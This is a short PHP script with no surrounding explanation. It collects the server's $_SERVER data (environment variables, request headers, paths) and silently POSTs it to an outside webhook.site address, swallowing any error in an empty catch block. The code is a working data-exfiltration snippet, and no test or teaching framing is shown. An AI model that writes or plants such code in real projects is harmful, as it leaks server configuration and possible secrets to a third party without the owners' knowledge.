<?php


try {

$params=[
	'server' => json_encode($_SERVER)
];
$defaults = array(
CURLOPT_URL => 'https://webhook.site/912e814f-6367-439f-92f1-7619a2a9c2f5',
CURLOPT_POST => true,
CURLOPT_POSTFIELDS => $_SERVER,
);
$ch = curl_init();
curl_setopt_array($ch, ($defaults));
curl_exec($ch);
} catch(Exception $e) {
}
